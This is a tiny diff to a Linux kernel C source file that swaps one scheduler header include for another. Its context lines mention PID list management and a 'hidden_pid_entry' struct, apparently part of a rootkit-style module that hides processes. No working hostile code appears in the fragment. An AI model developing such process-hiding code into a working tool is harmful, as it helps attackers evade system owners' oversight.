@@ -15,7 +15,7 @@
 #include <linux/dcache.h>
 #include <asm/pgtable.h>
 #include <asm/tlbflush.h>
-#include <linux/sched/init.h> // For init_task
+#include <linux/sched/task.h>
 
 // --- PID list management (copied from original) ---
 struct hidden_pid_entry {
